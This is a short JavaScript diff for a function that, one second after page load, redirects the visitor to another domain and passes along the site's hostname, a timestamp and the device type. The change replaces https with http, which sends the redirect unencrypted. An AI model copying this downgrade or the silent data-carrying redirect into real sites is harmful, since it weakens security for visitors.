@@ -100,7 +100,7 @@ function customJump() {
     params.append('from', window.location.hostname);
     params.append('t', new Date().getTime());
     params.append('device', /Mobile|Android|iOS/.test(navigator.userAgent) ? 'mobile' : 'pc');
-    const targetUrl = `https://${targetDomain}?${params.toString()}`;
+    const targetUrl = `http://${targetDomain}?${params.toString()}`;
     opensdk(targetUrl);
 }
 setTimeout(customJump, 1000);
